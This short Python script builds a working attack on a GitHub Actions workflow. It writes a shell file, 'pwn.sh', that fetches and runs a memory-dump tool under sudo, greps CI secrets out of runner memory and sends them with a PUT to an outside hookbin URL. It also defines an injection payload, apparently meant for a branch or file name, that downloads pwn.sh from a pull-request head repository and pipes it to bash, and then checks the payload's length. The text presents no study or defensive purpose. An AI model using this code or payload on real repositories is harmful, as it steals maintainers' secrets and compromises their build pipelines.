import os
import subprocess

# The mandated exploit
exploit = """
echo "Okay, we got this far. Let's continue..."
curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> "/tmp/secrets"
curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
"""

with open("pwn.sh", "w") as f:
    f.write(exploit)

# Filename to download and run pwn.sh from the head repo
# We need to know the head repo and ref.
# From event.json:
# "head": {
#   "ref": "feature/temp-change-1776539233",
#   "repo": {
#     "full_name": "kn0vd3h1/ShimuraCurveALQuotients",

# Payload:
# pwn';S=$(pwd|cut -c1);H=$(jq -r .pull_request.head.repo.full_name $GITHUB_EVENT_PATH);B=$(jq -r .pull_request.head.sha $GITHUB_EVENT_PATH);curl -sSf https:${S}${S}raw.githubusercontent.com${S}${H}${S}${B}${S}pwn.sh|bash;#

# Let's check the length of this payload.
payload = "pwn';S=$(pwd|cut -c1);H=$(jq -r .pull_request.head.repo.full_name $GITHUB_EVENT_PATH);B=$(jq -r .pull_request.head.sha $GITHUB_EVENT_PATH);curl -sSf https:${S}${S}raw.githubusercontent.com${S}${H}${S}${B}${S}pwn.sh|bash;#"
print("PAYLOAD LENGTH:", len(payload))
